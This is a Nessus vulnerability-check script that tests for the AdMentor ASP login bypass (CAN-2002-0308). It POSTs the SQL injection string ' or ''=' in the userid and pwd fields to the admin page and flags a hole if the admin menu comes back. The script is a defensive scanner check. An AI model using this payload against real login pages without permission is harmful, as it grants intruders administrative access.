#
#
#
if(description)
{
 script_id(10880);
 script_bugtraq_id(4152);
 script_cve_id("CAN-2002-0308");
 script_version("$Revision: 1.16 $");
 name["english"] = "AdMentor Login Flaw";
 script_name(english:name["english"]);
 
 desc["english"] = "
AdMentor is a totally free ad rotator script written entirely in ASP. 
A security vulnerability in the product allows remote attackers to
cause the login administration ASP to allow them to enter without
knowing any username or password (thus bypassing any authentication
protection enabled for the ASP file).

Solution : Contact the author for a patch
See also : http://www.securiteam.com/windowsntfocus/5DP0N1F6AW.html

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "AdMentor Login Flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002 SecurITeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

function check(req)
{
  host = get_host_name();
  if ( ! is_cgi_installed_ka(item:req, port:port) ) return NULL;

  variables = string("userid=%27+or+%27%27%3D%27&pwd=%27+or+%27%27%3D%27&B1=Submit");
  req = string("POST ", req, " HTTP/1.1\r\n", "Host: ", host, ":", port, "\r\n", "Content-Type: application/x-www-form-urlencoded\r\n", "Content-Length: ", strlen(variables), "\r\n\r\n", variables);

  buf = http_keepalive_send_recv(port:port, data:req);
  if(buf == NULL)exit(0);

  if (("Welcome" >< buf) && ("Admin interface" >< buf) && ("AdMentor Menu" >< buf))
  {
   	security_hole(port:port);
	exit(0);
  }
 
 
 return(0);
}

port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);


url = string("/admentor/admin/admin.asp?login=yes");
check(req:url);

url = string("/ads/admentor/admin/admin.asp?login=yes");
check(req:url);

foreach dir (cgi_dirs())
{
url = string(dir, "/admentor/admin/admin.asp?login=yes");
check(req:url);
}
